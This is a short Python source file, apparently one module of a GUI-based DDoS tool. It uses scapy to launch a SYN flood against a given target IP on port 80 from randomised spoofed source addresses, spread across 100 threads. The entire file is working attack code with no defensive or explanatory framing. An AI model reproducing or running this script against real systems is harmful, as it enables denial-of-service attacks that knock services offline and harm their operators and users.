import ctypes , time
from threading import Thread
import threading
from scapy.all import IP,RandIP,TCP,send
thread=100

def synFloodAttack(ddos,sport, target_ip,dport):
  
    s_addr = RandIP()   #random Ip address
    pkt =IP(src= s_addr, dst= target_ip)/ TCP(sport =sport, dport=dport, seq= 1505066, flags="S")
    send(pkt)
    output2='\n[+]successfully sent packet to '+str(target_ip)+ 'with ip '+str(s_addr)
    ddos.ddos_textBrowser.append(output2)
    time.sleep(0.5)
  


def main(ddos, option, target_ip,b):
 #f=int(b)
 #if f=="":
  # f=100
 tgtPort=80
 for x in range(100):
   t = Thread(target=synFloodAttack, args=(ddos,1234, target_ip,int(tgtPort)))
   t.start()
   
     


   


    